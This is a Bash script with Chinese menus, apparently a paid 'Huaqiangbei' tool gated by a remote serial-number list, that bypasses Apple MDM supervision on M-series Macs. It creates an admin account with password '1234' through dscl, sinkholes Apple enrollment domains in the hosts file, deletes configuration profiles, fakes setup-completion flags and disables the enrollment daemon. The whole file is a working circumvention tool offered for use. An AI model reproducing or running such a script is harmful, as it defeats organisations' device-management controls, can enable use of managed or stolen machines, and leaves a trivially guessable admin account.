#!/bin/bash
# ==========================================================
#        HUA QIANG BEI XIAO HU - M-SERIES ONLY (V24)
# ==========================================================

RED='\033[1;31m'
GRN='\033[1;32m'
YLW='\033[1;33m'
BLU='\033[1;34m'
CYN='\033[1;36m'
NC='\033[0m'

# 1. 联网监测
check_network() {
    printf "${CYN}[网络监测] 检查联网状态...${NC}\n"
    while ! ping -c 1 -W 2 google.com >/dev/null 2>&1 && ! ping -c 1 -W 2 baidu.com >/dev/null 2>&1; do
        printf "${RED}❌ 未联网！请连接 Wi-Fi 后重试。${NC}\n"
        printf "${CYN}等待中...${NC}\n"
        sleep 5
    done
    printf "${GRN}✅ 网络已连接${NC}\n"
}

# 2. M 系列专用磁盘锁定
find_m_disks() {
    # M 系列恢复模式下 Data 盘通常挂载在 /Volumes/Data
    DATA_PATH="/Volumes/Data"
    # 系统盘通常是除了 Data 和 Image 以外最大的那个 Volumes 目录
    SYS_PATH=$(df | grep "/Volumes/" | grep -v "Data" | grep -v "Image" | head -n 1 | awk '{for(i=6;i<=NF;i++) printf $i" "; print ""}' | xargs)
    
    [ -z "$SYS_PATH" ] && SYS_PATH="/Volumes/Macintosh HD"
}

# 3. 序列号验证
verify_sn() {
    SN=$(ioreg -l | grep IOPlatformSerialNumber | awk -F'"' '{print $4}' | xargs)
    printf "${CYN}[授权查询] 序列号: ${YLW}$SN${NC}\n"
    CHECK=$(curl -fsSL "https://humdm.github.io/mdm-tools/sn.txt?$(date +%s)" | tr -d '\r' | grep -w "$SN")
    if [ -z "$CHECK" ]; then
        printf "${RED}❌ 授权失败！请联系小胡 (huhu-019)。${NC}\n"
        exit 1
    fi
    printf "${GRN}✅ 授权成功！${NC}\n"
}

# 4. M4 适配进度条
show_progress() {
    local label=$1
    printf "${BLU}[$label]${NC}\n"
    printf "${GRN}["
    for i in {1..50}; do printf "■"; sleep 0.005; done
    printf "] 100%%${NC}\n\n"
}

# --- 初始化 ---
check_network
verify_sn

# 🚀 M 系列专属菜单
while true; do
    printf "\n"
    printf "${GRN}  ╔══════════════════════════════════════════════════════════╗${NC}\n"
    printf "${GRN}  ║          ★ 华强北小胡 - M 系列芯片专属版 ★              ║${NC}\n"
    printf "${GRN}  ╠══════════════════════════════════════════════════════════╣${NC}\n"
    printf "${GRN}  ║  💻 适用范围：M1 / M2 / M3 / M4 全系列                   ║${NC}\n"
    printf "${GRN}  ║  🔒 核心功能：暴力清空监管库 | 自动提权重启              ║${NC}\n"
    printf "${GRN}  ╚══════════════════════════════════════════════════════════╝${NC}\n"
    printf "\n"
    printf "    ${YLW}1)${NC} ${BLU}一键全自动绕过 (M4 强力推荐)${NC}\n"
    printf "    ${YLW}2)${NC} ${BLU}桌面弹窗补救 (进入桌面后运行)${NC}\n"
    printf "    ${YLW}3)${NC} ${BLU}查看监管状态 (Error 代表成功)${NC}\n"
    printf "    ${YLW}4)${NC} ${BLU}立即重启 MacBook${NC}\n"
    printf "    ${RED}q)${NC} ${YLW}退出${NC}\n"
    printf "  ────────────────────────────────────────────────────────────\n"
    printf "  请选择: "
    
    read opt < /dev/tty
    
    case $opt in
        1) 
            find_m_disks
            show_progress "第一阶段：创建管理账户 (1234)"
            DS_DB="$DATA_PATH/private/var/db/dslocal/nodes/Default"
            if [ -d "$DS_DB" ]; then
                dscl -f "$DS_DB" localhost -create "/Local/Default/Users/MacBook" > /dev/null 2>&1
                dscl -f "$DS_DB" localhost -passwd "/Local/Default/Users/MacBook" "1234"
                dscl -f "$DS_DB" localhost -append "/Local/Default/Groups/admin" GroupMembership "MacBook"
            fi

            show_progress "第二阶段：五域名封锁 (Hosts)"
            if [ -d "$SYS_PATH/etc" ]; then
                chflags nouchg "$SYS_PATH/etc/hosts" > /dev/null 2>&1
                printf "0.0.0.0 deviceenrollment.apple.com\n0.0.0.0 mdmenrollment.apple.com\n0.0.0.0 iprofiles.apple.com\n0.0.0.0 acmdm.apple.com\n0.0.0.0 albert.apple.com\n" >> "$SYS_PATH/etc/hosts"
            fi
            
            show_progress "第三阶段：M 系列暴力清库"
            # 彻底删除 M 芯片系统里残留的任何监管记录
            rm -rf "$SYS_PATH/var/db/ConfigurationProfiles"/* 2>/dev/null
            touch "$DATA_PATH/private/var/db/.AppleSetupDone" 2>/dev/null
            touch "$SYS_PATH/var/db/ConfigurationProfiles/Settings/.cloudConfigProfileInstalled" 2>/dev/null
            
            printf "\n${GRN}★ M 系列绕过完成！重启进桌面密码 1234 ★${NC}\n"
            sleep 2
            ;;
        2)
            echo -e "\n${RED}⚠️ 正在强制闭嘴弹窗 (需要 1234 密码)...${NC}"
            if sudo -v; then
                sudo rm -rf /var/db/ConfigurationProfiles/* 2>/dev/null
                sudo touch /var/db/ConfigurationProfiles/Settings/.cloudConfigProfileInstalled > /dev/null 2>&1
                sudo launchctl disable system/com.apple.ManagedClient.enroll > /dev/null 2>&1
                printf "${GRN}✅ 已强制删除桌面监管通知，请重启生效！${NC}\n"
            fi
            sleep 2
            ;;
        3)
            STATUS=$(sudo profiles show -type enrollment 2>&1)
            if echo "$STATUS" | grep -q "Error"; then
                echo -e "\n${GRN}✅ 屏蔽完美生效！系统已断开监管。${NC}"
            else
                echo -e "\n${YLW}[监管信息]:${NC}\n$STATUS"
            fi
            read -p "按回车返回..." < /dev/tty
            ;;
        4) sudo reboot || reboot ;;
        q) exit 0 ;;
        *) clear ;;
    esac
done
